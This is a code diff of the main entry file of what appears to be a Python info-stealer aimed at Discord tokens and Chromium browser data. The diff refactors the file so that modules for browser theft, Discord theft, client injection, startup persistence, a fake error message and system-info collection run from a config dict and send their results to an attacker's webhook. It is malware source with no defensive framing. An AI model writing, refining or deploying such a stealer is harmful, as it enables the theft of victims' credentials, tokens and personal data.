@@ -6,35 +6,26 @@ from util.injection import *
 from util.exectime import *
 from util.startup import *
 from util.systeminfo import *
+from config import __CONFIG__
 
-
-__WEBHOOK__ = __import__("base64").b64decode("&WEBHOOK_URL_ENC&").decode("utf-8")
-
-__USE_ERROR_MESSAGE__ = False
-__ERROR_MESSAGE__ = __import__("base64").b64decode("&ERROR_MESSAGE_ENC&").decode("utf-8")
-
-
-def main(webhook: str) -> None:
+def main():
     funcs = [
-         debug,
-         Injection,
-         exec_time,
-         startup,
-         chromium,
-         discord,
-         
+        debug,
+        chromium,
+        discord,
+        fake_error,
+        Injection,
+        exec_time,
+        startup,
+        SystemInfo,
     ]
 
     for func in funcs:
-        if type(func) == type:
-            [func(webhook) if 'webhook' in func.__init__.__code__.co_varnames else func()]
+        if __CONFIG__[func.__name__.lower()]:
+            if func.__init__.__code__.co_argcount == 2:
+                func(__CONFIG__['webhook'])
+            else:
+                func()
 
-        else:
-            [func(webhook) if 'webhook' in func.__code__.co_varnames else func()]
-
-    if __USE_ERROR_MESSAGE__:
-        fake_error(__ERROR_MESSAGE__)
-
-
-if __name__ == "__main__":
-    main(__WEBHOOK__)
+if __name__ == '__main__':
+    main()
